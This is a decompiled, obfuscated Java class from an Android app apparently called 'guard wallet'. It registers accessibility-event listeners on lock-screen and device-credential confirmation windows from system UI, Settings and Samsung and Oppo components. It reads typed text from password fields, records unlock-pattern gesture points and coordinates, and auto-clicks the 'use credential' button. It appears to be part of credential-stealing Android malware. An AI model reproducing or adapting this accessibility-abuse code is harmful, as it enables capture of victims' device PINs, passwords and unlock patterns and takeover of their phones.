package o;

import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.condition.TargetActionCondition;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.EventSubscribe;
import com.guard.wallet.req.ListenWindow;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Objects;

public final class h extends e {
   public h() {
      super(M(), "com.android.systemui");
   }

   public static CombineFilter H(String var0) {
      CombineFilter var1 = new CombineFilter();
      StringCondition var2 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "id");
      var2.setEquals(var0.concat(":id/button_use_credential"));
      var1.getStringConditions().add(var2);
      return var1;
   }

   public static ListenWindow I(String var0) {
      ListenWindow var1 = new ListenWindow(var0, null);
      var1.setId("confirmDeviceCredentialNoneWithSubscribes:".concat(var0));
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(L(var0));
      var1.setEventTypes(new HashSet<>());
      o.b.q(2048, o.b.q(32, var1.getEventTypes(), var1), var1).add(16384);
      var1.getEventSubscribes().add(Q(var0));
      var1.getEventSubscribes().add(N(var0));
      var1.getEventSubscribes().add(O(var0));
      var1.getEventSubscribes().add(P(var0));
      return var1;
   }

   public static ListenWindow J(String var0) {
      ListenWindow var1 = new ListenWindow(var0, "com.android.settings.password.ConfirmDeviceCredentialActivity");
      var1.setId("confirmDeviceCredentialWithSubscribes:".concat(var0));
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(L(var0));
      var1.setEventTypes(new HashSet<>());
      o.b.q(2048, o.b.q(32, var1.getEventTypes(), var1), var1).add(16384);
      var1.getEventSubscribes().add(Q(var0));
      var1.getEventSubscribes().add(N(var0));
      var1.getEventSubscribes().add(O(var0));
      var1.getEventSubscribes().add(P(var0));
      return var1;
   }

   public static ListenWindow K(String var0) {
      ListenWindow var1 = new ListenWindow(var0, "com.android.settings.password.ConfirmLockPassword");
      var1.setId("confirmLockPasswordWithSubscribes:".concat(var0));
      var1.setEventTypes(new HashSet<>());
      o.b.q(2048, o.b.q(32, var1.getEventTypes(), var1), var1).add(16384);
      var1.getEventSubscribes().add(Q(var0));
      var1.getEventSubscribes().add(N(var0));
      return var1;
   }

   public static CombineFilter L(String var0) {
      CombineFilter var2 = new CombineFilter();
      StringCondition var1 = o.b.b(var2, a.a.c(var2, "className", "android.widget.TextView"), "id");
      var1.setEquals(var0.concat(":id/title"));
      var2.getStringConditions().add(var1);
      return var2;
   }

   public static LinkedList M() {
      LinkedList var0 = new LinkedList();
      var0.add(R("com.android.systemui"));
      var0.add(J("com.android.systemui"));
      var0.add(I("com.android.systemui"));
      var0.add(K("com.android.systemui"));
      var0.add(R("com.android.settings"));
      var0.add(J("com.android.settings"));
      var0.add(I("com.android.settings"));
      var0.add(K("com.android.settings"));
      var0.add(R("com.samsung.android.biometrics.app.setting"));
      var0.add(J("com.samsung.android.biometrics.app.setting"));
      var0.add(I("com.samsung.android.biometrics.app.setting"));
      var0.add(K("com.samsung.android.biometrics.app.setting"));
      return var0;
   }

   public static EventSubscribe N(String var0) {
      EventSubscribe var1 = new EventSubscribe();
      var1.setId("lockPasswordEditSubscribe:".concat(var0));
      var1.setListenType(1);
      var1.setSourceRule(0);
      CombineFilter var3 = new CombineFilter();
      StringCondition var2 = a.a.c(var3, "className", "android.widget.EditText");
      var3.getStringConditions().add(var2);
      var1.setCombineFilter(var3);
      var1.setListenProps(new LinkedList<>());
      var1.getListenProps().add("text");
      var1.setEventTypes(new HashSet<>());
      var1.getEventTypes().add(16);
      var1.getEventTypes().add(8192);
      return var1;
   }

   public static EventSubscribe O(String var0) {
      EventSubscribe var3 = new EventSubscribe();
      var3.setId("lockPatternSubscribe:".concat(var0));
      var3.setListenType(1);
      var3.setSourceRule(0);
      CombineFilter var1 = new CombineFilter();
      StringCondition var2 = o.b.b(var1, a.a.c(var1, "className", "android.view.View"), "id");
      var2.setEquals(var0.concat(":id/lockPattern"));
      var1.getStringConditions().add(var2);
      var3.setCombineFilter(var1);
      var3.setListenProps(new LinkedList<>());
      var3.getListenProps().add("boundsInScreen");
      var3.getListenProps().add("boundsInParent");
      var3.getListenProps().add("GESTURE_POINTS");
      var3.setHelperProp("GESTURE_POINTS");
      var3.setListenHelper(true);
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(32);
      var3.getEventTypes().add(2048);
      var3.getEventTypes().add(16384);
      return var3;
   }

   public static EventSubscribe P(String var0) {
      EventSubscribe var1 = new EventSubscribe();
      var1.setId("oppoLockPatternSubscribe:".concat(var0));
      var1.setListenType(1);
      var1.setSourceRule(0);
      CombineFilter var2 = new CombineFilter();
      StringCondition var3 = o.b.b(var2, a.a.c(var2, "className", "android.view.View"), "id");
      var3.setEquals(var0.concat(":id/biometric_lockPattern"));
      var2.getStringConditions().add(var3);
      var1.setCombineFilter(var2);
      var1.setListenProps(new LinkedList<>());
      var1.getListenProps().add("boundsInScreen");
      var1.getListenProps().add("boundsInParent");
      var1.getListenProps().add("GESTURE_POINTS");
      var1.setHelperProp("GESTURE_POINTS");
      var1.setListenHelper(true);
      var1.setEventTypes(new HashSet<>());
      var1.getEventTypes().add(32);
      var1.getEventTypes().add(2048);
      var1.getEventTypes().add(16384);
      return var1;
   }

   public static EventSubscribe Q(String var0) {
      EventSubscribe var2 = new EventSubscribe();
      var2.setId("useCredentialEventSubscribe:".concat(var0));
      Integer var1 = 1;
      var2.setListenType(var1);
      var2.setSourceRule(0);
      var2.setCombineFilter(H(var0));
      var2.setEventTypes(new HashSet<>());
      var2.getEventTypes().add(32);
      var2.getEventTypes().add(2048);
      var2.getEventTypes().add(16384);
      TargetActionCondition var3 = new TargetActionCondition();
      var3.setActionType(var1);
      var3.setActionName("click");
      var2.setReplyActions(new LinkedList<>());
      var2.getReplyActions().add(var3);
      return var2;
   }

   public static ListenWindow R(String var0) {
      ListenWindow var1 = new ListenWindow(var0, "android.widget.LinearLayout");
      var1.setId("useCredentialLayoutWithSubscribes:".concat(var0));
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(H(var0));
      var1.setEventTypes(new HashSet<>());
      o.b.q(2048, o.b.q(32, var1.getEventTypes(), var1), var1).add(16384);
      var1.getEventSubscribes().add(Q(var0));
      return var1;
   }

   @Override
   public final boolean equals(Object var1) {
      return var1 instanceof h;
   }

   @Override
   public final int hashCode() {
      return Objects.hash(h.class.getName());
   }

   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      super.u(var1, var2, var3);
   }
}
